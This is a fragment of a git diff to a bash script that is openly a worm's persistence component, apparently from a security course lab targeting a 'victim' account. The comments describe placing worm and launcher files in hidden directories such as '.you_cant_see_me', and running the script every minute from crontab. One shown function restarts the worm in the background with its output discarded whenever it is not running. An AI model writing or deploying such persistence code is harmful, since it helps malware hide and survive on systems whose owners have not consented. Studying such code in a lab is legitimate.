@@ -1,15 +1,14 @@
 #!/bin/bash
 
 # This script is to:
-# (1) Put the worm binary at the two locations:
+# (1) Gaurentee the worm files are put at the two locations:
 #      * /home/victim/.etc/.module/Flooding_Attack
 #      * /home/victim/.firefox/.module/Flooding_Attack
-# (2) Put the worm launcher program at 
+# (2) Gaurentee the laucnher files are put at the two locations: 
 #      * /home/victim/.Launch_Attack/Launching_Attack
 #      * /home/victim/.you_cant_see_me/Launching_Attack
-# (3) Tamper the crontab so that the worm is executed whenever the computer is booted
 # 
-# Noted that this script does not do any payload.
+# This script should be exeucted every minute. The crontab should execute this script.
 
 ldir1="/home/victim/.Launch_Attack"
 ldir2="/home/victim/.you_cant_see_me"
@@ -43,7 +42,7 @@ require_launcher_distributed(){
 require_worm_running(){
     ps -e | grep -q "$wfname"
     if [ $? -ne 0 ]; then
-	# The final & makes this command run in background
+	    # The final & makes this command run in background
         chmod +x $wdir1/$wfname && $wdir1/$wfname &> /dev/null &
     fi
 }
